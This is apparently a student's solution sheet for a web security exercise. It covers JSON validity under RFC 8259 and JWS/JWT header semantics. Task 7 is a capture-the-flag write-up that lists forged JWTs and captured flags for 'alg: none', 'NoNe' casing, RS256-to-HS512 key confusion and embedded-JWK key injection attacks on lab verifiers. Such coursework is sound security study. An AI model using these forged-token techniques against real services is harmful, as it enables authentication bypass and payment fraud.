# Excersise 1

## Task 1

Check out [this Postman collection](./task1.json).

## Task 2

a) No, because `True` must be `true`

b) Yes, it is an array

c) Yes, a string is primitive datatype

d) No, RFC8259 doesn't specify comments and "/" isn't a structural character according to section 7 of RFC8259

e) Yes, it is a primitive datatype

f) Yes, it is a string / primitiv datatype, just encoded

g) Yes, it is a number according to section 6 of RFC8259

h) No, RFC8259's number definition doesn't allow leading zeros

i) Yes, it is just an array of empty objects

j) No, the key 1337 isn't a string

## Task 3

a) It uses ES256 which means the signature is calculated using ECDSA with a P-256 curve and SHA256 hashing algorithm.

b) It depends, if the signature calculation process ignores `gid` too, than yes. The signature doesn't protect the integrity
of `gid` in this case. But if the signature calculation process inludes `gid`, than we cannot change this parameter,
because the signature would change. On the otherhand, if the calculation of the signature includes `gid`, but the
verification process ignores it, the signature would never be accepted as valid, because the underlaying values differ.

## Task 4

a) The JWT encodes the private RSA parameters within its header.

b) The JWT header contains the public key as `x5c` value. An attacker could exchange the public key with its own. As the
attaker can generate easily it's own key-pair, the attacker can calculate the signature by itself. If the server just takes
the given public key to verify the signature, an attacker can easly create valid JWTs.

## Task 5

Check out [this HTML](./task5.html).

## Task 6

a) `A256GCMKW`: Key wrapping with AES GCM using 256-bit key

b) `ES384`

c) `jku`, `jwk`, `kid`, `x5u`, `x5c`, `x5t`, `x5t#S256`

d) The `crit` header tries to ensure that required parameters are used and understood on the server site.

e) JWS JSON Serialization to support signatures over a subset of values of the JWT. The Compact Serialization just support one signature and no unprotected values.

## Task 7

a)

- Verifier 2: Set `alg` to `none` and remove signature: `FLAG{json_signature_verifier_2_RWHiX1ifds0GqpKl}`
    JWT:
    ```
    eyJ0eXAiOiJKV1QiLCJnaWQiOiI0OTA2YWNmNy1hNzlhLTQ1ZWItOTkxOS1mNzkxNThlYWM3MmEiLCJhbGciOiJub25lIiwiandrIjp7Imt0eSI6IlJTQSIsImUiOiJBUUFCIiwidXNlIjoic2lnIiwia2lkIjoiY2VkMmEwNjUtOWY1My00YzIyLWI4NzItNzAyZGE5MDZmZDA0IiwibiI6ImlZSnFreUc2ajhBdGF2RVZnOFVEV2hhbDNJQ1Z4Y2hnV1dWQmdvVmRuel94aWZ0bS1ZRFhSNmxEclliLUZKdnViMWd5MmN0cHdHLU5VVThUektQSjJQZ0ZMM1lHM3RhbmxkWG0takxvb1NnTFBTZ0RHMk1zRWtzV1RvX2lxalZKSjhvR1hWZWM1SEtRVTkwZ2NxQlFQUE1WalozOEJEOWZrcGJhWU4tWEM2VE9DYjVONUtiMDRraVp2dWY2ZHRyTUV0bHJUaHF0VXNGZXhQTld6T0dCU3E5Wk1FaVo1bjhMYzR2VVYydERYem9PblRWQWNfR0l5R2tVV1FRMGdvOWNFVXFvRVE2OTNLcTg5RmsyV2tfZENnU084bl85TlFuRml4Y0p1Y3M5Sk5EMmo1akhKNWptMGZjSnYwYUdsSGxKMGFWOWtIY2hIUDc3eFF0MXVfcDJRdyJ9LCJraWQiOiJjZWQyYTA2NS05ZjUzLTRjMjItYjg3Mi03MDJkYTkwNmZkMDQifQ.eyJhdWQiOiJWbGFkaXNsYXYuTWxhZGVub3YiLCJhbW91bnQiOiI5OSIsImliYW4iOiJERTY2IDY2NjYgNjY2NiA2NjY2IDY2IiwiaXNzIjoiQ2hyaXN0aWFuLk1haW5rYSJ9.
    ```
- Verifier 3: Set `alg` to `NoNe` (and let signature attached): `FLAG{json_signature_verifier_3_4dwCLnHa81FguV49}`
    JWT:
    ```
    eyJ0eXAiOiJKV1QiLCJnaWQiOiI0OTA2YWNmNy1hNzlhLTQ1ZWItOTkxOS1mNzkxNThlYWM3MmEiLCJhbGciOiJOb05lIiwiandrIjp7Imt0eSI6IlJTQSIsImUiOiJBUUFCIiwidXNlIjoic2lnIiwia2lkIjoiY2VkMmEwNjUtOWY1My00YzIyLWI4NzItNzAyZGE5MDZmZDA0IiwibiI6ImlZSnFreUc2ajhBdGF2RVZnOFVEV2hhbDNJQ1Z4Y2hnV1dWQmdvVmRuel94aWZ0bS1ZRFhSNmxEclliLUZKdnViMWd5MmN0cHdHLU5VVThUektQSjJQZ0ZMM1lHM3RhbmxkWG0takxvb1NnTFBTZ0RHMk1zRWtzV1RvX2lxalZKSjhvR1hWZWM1SEtRVTkwZ2NxQlFQUE1WalozOEJEOWZrcGJhWU4tWEM2VE9DYjVONUtiMDRraVp2dWY2ZHRyTUV0bHJUaHF0VXNGZXhQTld6T0dCU3E5Wk1FaVo1bjhMYzR2VVYydERYem9PblRWQWNfR0l5R2tVV1FRMGdvOWNFVXFvRVE2OTNLcTg5RmsyV2tfZENnU084bl85TlFuRml4Y0p1Y3M5Sk5EMmo1akhKNWptMGZjSnYwYUdsSGxKMGFWOWtIY2hIUDc3eFF0MXVfcDJRdyJ9LCJraWQiOiJjZWQyYTA2NS05ZjUzLTRjMjItYjg3Mi03MDJkYTkwNmZkMDQifQ.eyJhdWQiOiJWbGFkaXNsYXYuTWxhZGVub3YiLCJhbW91bnQiOiI5OSIsImliYW4iOiJERTY2IDY2NjYgNjY2NiA2NjY2IDY2IiwiaXNzIjoiQ2hyaXN0aWFuLk1haW5rYSJ9.XawDXZwIE3T2UADtEcF-uSI1MmmiZDxd8FsZCPUjEb-_Vt5zJUvCWMqNwJ4qOd5GRs7GYiMR_gye_H8TS9BPVeMbnxQ73B42v8fnzJLvkPAqdBuYGlPBt6UGqzltfORI769jZRfJudcWoSt4GAFHZffIqTarKlrpYjrIXWrX4d1x1ZFbTZAmGHbx2a1P2ZmQADd1u2FKdmApNItUdphnKS9INYBBn-IhgHnbENPHbjqtPIEb3pw1ZgHue5ZzHmlTlaerfabheI-h2dc37DIIbSrtt82DqML7r-H_8i2hNSKepttyGPC5KBG8jLHbLoer3mDLKB7A9rHBTItjeoDgHQ
    ```
- Verifier 5: `alg`: RS256 -> HS512: PEM encoded key (base64) without header, footer, newlines (BASE64) `FLAG{json_signature_verifier_5_koymIl8FvRvbaKck}`
    JWT:
    ```
    eyJ0eXAiOiJKV1QiLCJnaWQiOiI0OTA2YWNmNy1hNzlhLTQ1ZWItOTkxOS1mNzkxNThlYWM3MmEiLCJhbGciOiJIUzUxMiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6ImNlZDJhMDY1LTlmNTMtNGMyMi1iODcyLTcwMmRhOTA2ZmQwNCIsIm4iOiJpWUpxa3lHNmo4QXRhdkVWZzhVRFdoYWwzSUNWeGNoZ1dXVkJnb1ZkbnpfeGlmdG0tWURYUjZsRHJZYi1GSnZ1YjFneTJjdHB3Ry1OVVU4VHpLUEoyUGdGTDNZRzN0YW5sZFhtLWpMb29TZ0xQU2dERzJNc0Vrc1dUb19pcWpWSko4b0dYVmVjNUhLUVU5MGdjcUJRUFBNVmpaMzhCRDlma3BiYVlOLVhDNlRPQ2I1TjVLYjA0a2ladnVmNmR0ck1FdGxyVGhxdFVzRmV4UE5Xek9HQlNxOVpNRWlaNW44TGM0dlVWMnREWHpvT25UVkFjX0dJeUdrVVdRUTBnbzljRVVxb0VRNjkzS3E4OUZrMldrX2RDZ1NPOG5fOU5RbkZpeGNKdWNzOUpORDJqNWpISjVqbTBmY0p2MGFHbEhsSjBhVjlrSGNoSFA3N3hRdDF1X3AyUXcifSwia2lkIjoiY2VkMmEwNjUtOWY1My00YzIyLWI4NzItNzAyZGE5MDZmZDA0In0.eyJhdWQiOiJWbGFkaXNsYXYuTWxhZGVub3YiLCJhbW91bnQiOiI5OSIsImliYW4iOiJERTY2IDY2NjYgNjY2NiA2NjY2IDY2IiwiaXNzIjoiQ2hyaXN0aWFuLk1haW5rYSJ9.8YIG0yfwuW6RSUpcU4UQ9llLQcCLt8cRUzVz_II500d4eOkMSo35P2eHuzhFtpeKPFe-0v9sW7z9MKFzG9F6sA
    ```
- Verifier 6: Custom Key Attack / Public Key Injection via embedded JWK. `FLAG{json_signature_verifier_6_HFdeYxqcGvyaHOyI}`
    JWT: 
    ```
    eyJ0eXAiOiJKV1QiLCJnaWQiOiI0OTA2YWNmNy1hNzlhLTQ1ZWItOTkxOS1mNzkxNThlYWM3MmEiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImV4dCI6dHJ1ZSwia3R5IjoiUlNBIiwibiI6IjBzSGQxQVJXQ0g2bzBJQ3FyMmE1b19Yc1JrQmRQMGY3c2dCMkxxWlpwRm1rczhCQm51Nm5Pb1dXYW40bVA1MHNLTl9QZWNoNFljVmxvZGMzQ0lSSkdJb0FuTGUwRnVSMy0zYV83M3R0X01BY0dzYTMxcXlFblg3VVFaWFRQRmpROXFlNFQ2cE1RaDFFUEtTU3c3Y3ZLYzJ6WmlrX2lMYXE3QVlCTVlKa0h4ZmNBQnZvcEMtT09DRkNTREp5Sk4zVUd0eUVBd0NnZHh1aEdsTXZWSjhWMzJ2bXJBSTdxZFdjQUhXaWVWYTdvN0tfTzdENGIzSzl4RjFQLTROT0duUDNtSy1nYldnT0lweHJ0VGU4V2hXY2d0OVYzYWFoZHFnbTNHVmZxMURRaUctbG14WWY3UjZJdmdUdVRBc04wVnFzNm5tc2x4R0lXSVVTcjhHSEFRXzFpdyJ9fQ.eyJhdWQiOiJWbGFkaXNsYXYuTWxhZGVub3YiLCJhbW91bnQiOiI5OSIsImliYW4iOiJERTY2IDY2NjYgNjY2NiA2NjY2IDY2IiwiaXNzIjoiQ2hyaXN0aWFuLk1haW5rYSJ9.vsXFvI-_ThTcWaYx7jtxD3e4iF_7jXkQsdobi_NjwKlGJccQFMLk4HpJahcytSBRPI5vHmNgmVg2_upEzCcjtypj0lXEx0-K0oGNQSTCzKYv0Ih-dug31h5unhABIGJqulilVu1C_-MPg11Hvlj_gMggsUSAUPn9bT-_Wofk-8RGvB5XkXTEQJJ65cZomDNm_lWs5_XEFhW4W4mTx0gj8RVoqXOqFYv-2mWYKXlv5B54DdIQRr6yHfdLghziIU4pXhnxLxAGslOSFpsdY194_Z5vzoS7PNqXIrLu3qAZeWQ0uuXtvqxsoDJ8oFjN1gTnoW1WohHr-XcfHTe1wYqgzg
    ```